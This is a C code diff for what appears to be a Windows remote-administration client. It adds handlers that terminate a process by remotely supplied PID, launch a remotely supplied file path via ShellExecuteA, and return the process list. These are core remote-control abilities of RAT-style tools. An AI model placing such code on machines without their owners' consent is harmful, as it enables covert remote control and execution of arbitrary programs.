@@ -10,7 +10,10 @@
 #include "remote_client.h"
 #include "remote_log.h"
 #include "remote_desktop.h"
+#include <Shellapi.h>
 #include <stdio.h>
+
+#pragma comment(lib, "shell32.lib")
 #include <stdlib.h>
 #include <string.h>
 
@@ -234,6 +237,91 @@ void remote_client_run(void) {
                                     remote_log("[loop] GetDrivesResponse prepend_imessage failed");
                             } else
                                 remote_log("[loop] GetDrivesResponse encode failed (no drives?)");
+                        }
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_DoProcessEnd) {
+                        remote_log("[loop] handling DoProcessEnd");
+                        {
+                            const unsigned char* body = dispatch_buf + consumed;
+                            unsigned int body_len = dispatch_len - consumed;
+                            int pid = 0;
+                            if (remote_proto_decode_do_process_end(body, body_len, &pid)) {
+                                int ok = 0;
+                                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
+                                if (hProc) {
+                                    if (TerminateProcess(hProc, 0)) ok = 1;
+                                    CloseHandle(hProc);
+                                }
+                                unsigned char resp_body[32];
+                                unsigned int resp_len = remote_proto_encode_do_process_response(1, ok, resp_body, sizeof(resp_body));
+                                if (resp_len > 0) {
+                                    unsigned char full_msg[64];
+                                    unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
+                                        REMOTE_SUBTYPE_DoProcessResponse, resp_body, resp_len);
+                                    if (full_len > 0) {
+                                        unsigned char frame[68];
+                                        unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
+                                        remote_transport_send(transport, frame, frame_len);
+                                        remote_log("[loop] DoProcessResponse (End) sent: result=%s", ok ? "OK" : "FAIL");
+                                    }
+                                }
+                            } else
+                                remote_log("[loop] DoProcessEnd decode failed");
+                        }
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_DoProcessStart) {
+                        remote_log("[loop] handling DoProcessStart");
+                        {
+                            const unsigned char* body = dispatch_buf + consumed;
+                            unsigned int body_len = dispatch_len - consumed;
+                            char file_path[MAX_PATH];
+                            int is_update = 0;
+                            if (remote_proto_decode_do_process_start(body, body_len, file_path, sizeof(file_path), &is_update)) {
+                                int ok = 0;
+                                if (file_path[0]) {
+                                    HINSTANCE r = ShellExecuteA(NULL, "open", file_path, NULL, NULL, SW_SHOW);
+                                    ok = ((UINT_PTR)r > 32) ? 1 : 0;
+                                }
+                                if (is_update) ok = 0;
+                                unsigned char resp_body[32];
+                                unsigned int resp_len = remote_proto_encode_do_process_response(0, ok, resp_body, sizeof(resp_body));
+                                if (resp_len > 0) {
+                                    unsigned char full_msg[64];
+                                    unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
+                                        REMOTE_SUBTYPE_DoProcessResponse, resp_body, resp_len);
+                                    if (full_len > 0) {
+                                        unsigned char frame[68];
+                                        unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
+                                        remote_transport_send(transport, frame, frame_len);
+                                        remote_log("[loop] DoProcessResponse (Start) sent: result=%s", ok ? "OK" : "FAIL");
+                                    }
+                                }
+                            } else
+                                remote_log("[loop] DoProcessStart decode failed");
+                        }
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_GetProcesses) {
+                        remote_log("[loop] handling GetProcesses");
+                        {
+                            unsigned char resp_body[65536];
+                            unsigned int resp_body_len = remote_proto_encode_get_processes_response(resp_body, sizeof(resp_body));
+                            if (resp_body_len > 0) {
+                                unsigned char full_msg[65600];
+                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg),
+                                    REMOTE_SUBTYPE_GetProcessesResponse, resp_body, resp_body_len);
+                                if (full_len > 0) {
+                                    unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
+                                    if (frame_buf) {
+                                        unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
+                                        int sent = (frame_len > 0 && remote_transport_send(transport, frame_buf, frame_len));
+                                        HeapFree(GetProcessHeap(), 0, frame_buf);
+                                        remote_log("[loop] GetProcessesResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
+                                    } else
+                                        remote_log("[loop] GetProcessesResponse heap alloc failed");
+                                } else
+                                    remote_log("[loop] GetProcessesResponse prepend_imessage failed");
+                            } else
+                                remote_log("[loop] GetProcessesResponse encode failed");
                         }
                     }
                     else if (subtype == REMOTE_SUBTYPE_GetStartupItems) {
